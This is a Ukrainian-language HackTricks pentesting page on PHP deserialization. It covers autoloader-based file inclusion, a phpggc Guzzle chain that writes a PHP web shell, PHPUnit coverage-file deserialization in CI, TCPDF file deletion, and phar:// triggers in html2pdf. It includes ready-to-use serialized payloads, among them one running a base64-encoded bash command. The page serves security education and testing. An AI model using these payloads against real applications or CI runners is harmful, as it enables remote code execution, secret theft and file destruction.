# PHP - Deserialization + Autoload Classes

{{#include ../../banners/hacktricks-training.md}}

Спочатку слід перевірити, що таке [**Autoloading Classes**](https://www.php.net/manual/en/language.oop5.autoload.php).

## PHP deserialization + spl_autoload_register + LFI/Gadget

Ми опинилися в ситуації, де було знайдено **PHP deserialization in a webapp** з тим, що в поточному додатку **немає** бібліотеки, вразливої до гаджетів у **`phpggc`**. Однак у тому ж контейнері був інший composer webapp з вразливими бібліотеками. Тому метою було **завантажити composer loader іншого webapp** та використати його, щоб **завантажити gadget, який скористається тією бібліотекою** з webapp, вразливого до deserialization.

Steps:

- Ви знайшли **deserialization** і в поточному коді додатку **немає жодного gadget**
- Ви можете зловживати функцією **`spl_autoload_register`** як у прикладі нижче, щоб **завантажувати будь-який локальний файл з розширенням `.php`**
- Для цього ви використовуєте deserialization, де ім'я класу потрапляє в **`$name`**. Ви **не можете використовувати "/" або "."** в імені класу в serialized об'єкті, але **код** **замінює** **подкреслення** ("_") на слеші ("/"). Тож ім'я класу, наприклад, `tmp_passwd` буде перетворено на `/tmp/passwd.php`, і код спробує його завантажити.\
A **gadget example** will be: **`O:10:"tmp_passwd":0:{}`**

<details>
<summary>spl_autoload_register LFI/autoload example</summary>
```php
spl_autoload_register(function ($name) {

if (preg_match('/Controller$/', $name)) {
$name = "controllers/${name}";
} elseif (preg_match('/Model$/', $name)) {
$name = "models/${name}";
} elseif (preg_match('/_/', $name)) {
$name = preg_replace('/_/', '/', $name);
}

$filename = "/${name}.php";

if (file_exists($filename)) {
require $filename;
}
elseif (file_exists(__DIR__ . $filename)) {
require __DIR__ . $filename;
}
});
```
</details>

> [!TIP]
> Якщо у вас є можливість **завантаження файлу** і ви можете завантажити файл з **`.php` extension** ви могли б **зловживати цією функціональністю напряму** і одразу отримати RCE.

У моєму випадку такого не було, але всередині **того ж контейнера** була інша composer веб-сторінка з **бібліотекою, вразливою до `phpggc` gadget**.

- Щоб завантажити цю іншу бібліотеку, спочатку потрібно **завантажити composer loader тієї іншої веб-застосунку** (бо loader поточної програми не звернеться до бібліотек іншої). **Знаючи шлях до застосунку**, це дуже просто зробити так: **`O:28:"www_frontend_vendor_autoload":0:{}`** (У моєму випадку composer loader був у `/www/frontend/vendor/autoload.php`)
- Тепер ви можете **завантажити** composer loader іншого додатка, тож настав час **`generate the phpgcc`** **payload** для використання. У моєму випадку я використав **`Guzzle/FW1`**, який дозволив мені **записати будь-який файл у файловій системі**.
- Примітка: **згенерований gadget не працював**; щоб він запрацював, я **змінив** той payload **`chain.php`** phpggc і встановив **всі атрибути** класів **з private на public**. Якщо цього не зробити, після десеріалізації рядка атрибути створених об'єктів не мали жодних значень.
- Тепер у нас є спосіб **завантажити composer loader іншого додатка** і мати **phpggc payload, що працює**, але нам потрібно **зробити це В ОДНОМУ ЗАПИТІ, щоб loader був завантажений в момент використання гаджета**. Для цього я відправив серіалізований масив з обома об'єктами, наприклад:
- Ви можете бачити **спочатку loader, що завантажується, а потім payload**
```php
a:2:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}}
```
- Тепер ми можемо **створити й записати файл**, однак користувач **не міг записувати в жодну папку всередині веб-сервера**. Отже, як видно у payload, створюється PHP-файл, що викликає **`system`** з деяким **base64**, у **`/tmp/a.php`**. Тоді ми можемо **повторно використати перший тип payload**, який ми використали як LFI, щоб завантажити composer loader іншого webapp **щоб завантажити згенерований `/tmp/a.php`** файл. Просто додайте це до deserialization gadget:
```php
a:3:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}s:6:"Extra3";O:5:"tmp_a":0:{} }
```
**Короткий огляд payload**

- **Завантажити composer autoload** іншого webapp у тому ж контейнері
- **Завантажити phpggc gadget** щоб зловживати бібліотекою з іншого webapp (початковий webapp, вразливий до deserialization, не мав gadget у своїх бібліотеках)
- Gadget створить **файл з PHP payload** в /tmp/a.php з шкідливими командами (користувач webapp не може записувати в жодну папку жодного webapp)
- Остання частина нашого payload використає **load the generated php file**, який виконає команди

Мені потрібно було **викликати це deserialization двічі**. При тестуванні перший раз файл `/tmp/a.php` був створений, але не завантажений, а другий раз він був правильно завантажений.

### Останні phpggc новинки (2025)

- **Гілка master phpggc продовжує додавати chains**: OpenCart/RCE2, Drupal/FD1/SQLI1/XXE1, WordPress/YoastSEO/FW1 та інші з’явилися у 2025 — корисно, коли цільовий app ділиться vendor code з тими проектами. Швидкий спосіб пошуку: `phpggc -l | grep -E "OpenCart|Drupal|Yoast"` (оновіть свій клон спочатку).
- При змішуванні gadget-ів між app через autoloading пам’ятайте, що **private properties у визначеннях gadget можуть бути dropped**, коли класи перевизначаються інакше в цілі; відредагуйте gadget’s `chain.php`, щоб зробити властивості `public`, якщо payload приходить з порожніми значеннями (той самий трюк, показаний вище).

## PHPUnit PHPT coverage deserialization (CI/CD entrypoint)

`phpunit` before **8.5.52 / 9.6.34 / 10.5.63 / 11.5.50 / 12.5.8** (CVE-2026-24765) unserialized arbitrary PHP objects from `.coverage` files produced by the **PHPT runner**. In CI pipelines where untrusted contributors can push tests, dropping a crafted `.coverage` file triggers deserialization as soon as the suite runs — no web access needed.

**Хід атаки**

1. Помістіть шкідливий `.coverage` файл у репо (або артефакт), який містить serialized gadget, що існує в test dependencies (наприклад, Monolog або Guzzle chain з phpggc).
2. Відправте PR; коли CI виконає `phpunit --configuration phpunit.xml`, PHPT runner зчитає coverage файл і deserializes gadget, даючи **RCE inside the runner container**.
3. Це особливо небезпечно, коли тести маунтять CI secrets (cloud creds, deployment keys).

**Minimal malicious coverage stub (drop alongside a PHPT test):**
```php
<?php
$payload = file_get_contents('php://stdin'); // serialized gadget from phpggc
file_put_contents('exploit.coverage', $payload);
```
Run the PHPT так, щоб phpunit використовував `exploit.coverage`.

## TCPDF `__destruct` POP chain для довільного видалення файлів

Коли реальний екземпляр `TCPDF` видаляється збирачем сміття, він викликає `_destroy(true)`, ітеративно проходить по `$this->imagekeys` і викликає `unlink()` для всього, що виглядає як кеш-файл у межах `K_PATH_CACHE`. Якщо застосунок виконує `unserialize($user_data)` в той час, коли клас `TCPDF` завантажений (наприклад, він очікує масив з ключем `html`), ви можете надати серіалізований об'єкт, який встановлює:

- `file_id` на будь-яке ціле число, яке не присутнє в `self::$cleaned_ids` (наприклад `-1`).
- `imagekeys` на шляхи, що починаються з `K_PATH_CACHE` або які можна зробити схожими на нього (наприклад `/tmp/../tmp/do_not_delete_this_file.txt`, коли `K_PATH_CACHE` — `/tmp/`).

Приклад payload, що потрапляє в небезпечний `unserialize($_GET['p']); $pdf->writeHTML($payload['html']);` flow:
```text
a:1:{s:4:"html";O:5:"TCPDF":2:{s:7:"file_id";i:-1;s:9:"imagekeys";a:1:{i:0;s:39:"/tmp/../tmp/do_not_delete_this_file.txt";}}}
```
Файл видаляється, щойно об'єкт виходить з області видимості. TCPDF 6.9.3 посилив перевірку — тепер видаляються лише шляхи з префіксом `__tcpdf_<file_id>_` всередині `K_PATH_CACHE`, і додано `_unlink()`, щоб блокувати схеми, відмінні від `file://`, тому старіші версії `Producer` є ідеальними мішенями.

### Виклик gadget через `phar://` у html2pdf `<cert>` тегах

`spipu/html2pdf` (≤5.3.0) охоплює TCPDF і надає власний блок `<cert>`, атрибути `src`/`privkey` якого перевіряються за допомогою простого `file_exists()`. На PHP < 8.0 будь-яка файлово-системна функція, яка торкається URL `phar://`, призводить до деасеріалізації метаданих Phar. Розмістивши вищевказаний шкідливий об'єкт TCPDF у архіві Phar, ви отримуєте надійний POP навіть якщо застосунок ніколи сам не викликає `unserialize()`.

1. Створіть Phar з `phar.readonly=0`, налаштуйте stub/manifest так, щоб він виглядав як зображення (наприклад перейменуйте `archive.phar` в `archive.png`), і помістіть серіалізований об'єкт TCPDF у метадані Phar.
2. Завантажте/помістіть файл у місце з доступом, наприклад `/tmp/user_files/user_1/archive.png`.
3. Надішліть HTML, що містить тег `<cert>`, щоб html2pdf розв'язав шлях, контрольований атакувальником:
```html
<cert src="phar:///tmp/user_files/user_1/archive.png"
privkey="phar:///tmp/user_files/user_1/archive.png" />
```
Виклик `file_exists()` десеріалізує метадані, створює екземпляр TCPDF, а його деструктор видаляє обраний файл, перетворюючи html2pdf на потужну точку входу `phar://`. Версія 5.3.1 додала `Security::checkValidPath()` для блокування неприпустимих схем, тому застарілі розгортання залишаються привабливими.

## Посилання

- [Positive Technologies – Blind Trust: What Is Hidden Behind the Process of Creating Your PDF File?](https://swarm.ptsecurity.com/blind-trust-what-is-hidden-behind-the-process-of-creating-your-pdf-file/)
- [GitLab Advisory – CVE-2024-51058 TCPDF Hash Comparison / Phar Deserialization](https://advisories.gitlab.com/pkg/composer/tecnickcom/tcpdf/)
- [CVE-2026-24765 – PHPUnit PHPT Coverage Unsafe Deserialization](https://cvereports.com/reports/CVE-2026-24765)

{{#include ../../banners/hacktricks-training.md}}
